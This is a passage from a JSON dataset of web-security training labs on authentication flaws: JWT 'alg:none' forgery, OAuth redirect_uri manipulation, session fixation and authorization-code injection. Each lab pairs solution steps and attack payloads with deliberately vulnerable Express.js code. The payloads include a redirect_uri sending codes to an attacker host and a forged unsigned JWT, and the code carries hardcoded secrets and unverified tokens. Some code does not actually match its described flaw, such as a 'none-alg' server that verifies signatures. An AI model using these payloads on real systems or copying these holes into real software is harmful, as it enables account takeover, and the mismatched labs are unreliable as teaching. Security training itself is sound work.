    "Verify that the server accepts the token and returns Carlos's information."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpassword' }]; const schema = buildSchema(`type Query { me: User } type User { username: String, email: String }`); const root = { me: (args, context) => { if (!context.user) throw new Error('Unauthorized'); return { username: context.user.username, email: context.user.username + '@corp.local' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, 'jwtsecret'); } catch (e) { console.error('JWT verification failed:', e); } } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'jwtsecret'); res.json({ token }); }); app.listen(4001, () => console.log('JWT None Alg Lab running on http://localhost:4001'));",
  "payloads": [
    "JWT with header { \"alg\": \"none\" }, no signature",
    "Authorization: Bearer <none-alg-token>",
    "GraphQL query { me { username } }"
  ]
},
{
  "Lab scenario": "OAuth Redirect URI Manipulation in REST Authorization Flow",
  "Lab Description": "The application integrates OAuth for login via a third-party provider. However, the redirect_uri parameter is not properly validated during the authorization flow. To solve: Manipulate the redirect_uri to point to an attacker-controlled page and capture the authorization code to impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate an OAuth login and intercept the authorization request to the third-party provider.",
    "Note the redirect_uri parameter in the request. Modify it to point to a controlled domain (e.g., https://attacker.net/callback).",
    "Forward the modified request and log the authorization code received at the attacker domain (simulate it in Burp Collaborator).",
    "Use the captured code to perform the token exchange manually via Postman (POST /oauth/token with code and client credentials).",
    "Use the access_token to query the authenticated API endpoint and confirm Carlos’s identity."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code } = req.query; if (!code) return res.status(400).send('Missing code'); try { const tokenRes = await axios.post('https://provider.com/oauth/token', { code, client_id: 'client123', client_secret: 'secret456', redirect_uri: req.protocol + '://' + req.get('host') + req.originalUrl }); const accessToken = tokenRes.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: 'Bearer ' + accessToken } }); res.send('Welcome, ' + userInfo.data.username); } catch (e) { console.error('OAuth error:', e); res.status(500).send('OAuth failed'); } }); app.listen(4002, () => console.log('OAuth Redirect URI Lab running on http://localhost:4002'));",
  "payloads": [
    "redirect_uri=https://attacker.net/callback",
    "Capture code via redirected OAuth flow",
    "POST /oauth/token with stolen code"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP-based Login Endpoint",
  "Lab Description": "This lab's SOAP-based login API suffers from a session fixation vulnerability due to insecure session token handling. The application assigns a session ID before user authentication and does not renew it after login, allowing attackers to hijack user sessions. To solve: hijack Carlos's session and access his account page.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the initial unauthenticated SOAP login request and note the Set-Cookie response.",
    "2. Manually set the session cookie to a known value using Postman and perform the login with Carlos's credentials.",
    "3. Observe that the session token remains unchanged even after successful login, confirming fixation.",
    "4. Send the crafted session cookie to your browser and reuse it to access /my-account.",
    "5. Confirm access to Carlos's session by visiting the protected account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein123' }]; app.post('/soap-login', (req, res) => { let sessionId = req.cookies['sid'] || Math.random().toString(36).slice(2); res.cookie('sid', sessionId); const match = req.body.match(/<username>(.*)<\\/username>.*<password>(.*)<\\/password>/); if (match && match[1] === 'carlos' && match[2] === 'letmein123') { res.send(`<soap:Envelope><soap:Body><status>Login successful</status></soap:Body></soap:Envelope>`); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'fixated-session') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('SOAP Session Fixation running'));",
  "payloads": [
    "<soapenv:Envelope><soapenv:Body><username>carlos</username><password>letmein123</password></soapenv:Body></soapenv:Envelope>",
    "Cookie: sid=fixated-session",
    "GET /my-account HTTP/1.1"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL Login Token Handling",
  "Lab Description": "The application's GraphQL login system uses JWTs for session management but fails to validate the algorithm securely. The JWT library accepts tokens signed with 'alg':'none', allowing an attacker to forge tokens. To solve: forge a valid JWT to impersonate Carlos and access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login GraphQL mutation and obtain a valid JWT after authenticating as a normal user.",
    "2. Decode the JWT using jwt.io and note the algorithm is 'HS256'.",
    "3. Modify the JWT to set 'alg':'none' and change 'username':'carlos' in the payload.",
    "4. Remove the signature part entirely, rebase64-encode, and send the token in the Authorization header.",
    "5. Access /graphql with query {myAccount} and confirm the forged token grants Carlos's access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { login: token } }); } else if (query.includes('myAccount')) { const auth = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(auth, { complete: true }); if (payload?.payload?.username === 'carlos') { res.json({ data: { myAccount: 'Sensitive info of carlos' } }); } else { res.status(403).json({ error: 'Unauthorized' }); } } }); app.listen(4000, () => console.log('GraphQL JWT Tampering running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <forged_none_jwt>",
    "POST /graphql {\"query\":\"{myAccount}\"}"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Authorization Code Flow",
  "Lab Description": "The application uses OAuth with an external provider, but the authorization code is not properly bound to the client ID. This allows attackers to inject a stolen code into the REST /oauth-callback endpoint. To solve: perform an authorization code injection to hijack Carlos's OAuth session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the OAuth redirect and note the authorization code parameter in the /oauth-callback endpoint.",
    "2. Log in as your own user and capture your code during the OAuth flow.",
    "3. Send a malicious GET request to /oauth-callback using Carlos's session and your captured code.",
    "4. Observe that the code is accepted and your session now links to Carlos's account due to insecure client validation.",
    "5. Visit /my-account to confirm you're logged in as Carlos and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const axios = require('axios'); const app = express(); app.use(session({ secret: 'oauth-lab', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=lab-app&redirect_uri=http://localhost:4000/oauth-callback`); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); req.session.user = userInfo.data.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('OAuth account access: carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Confusion Lab running'));",
  "payloads": [
    "GET /oauth-callback?code=attacker_code_stolen_via_replay HTTP/1.1",
    "GET /my-account HTTP/1.1",
    "Modify Authorization Code in redirected request using Burp Repeater"
  ]
}
]
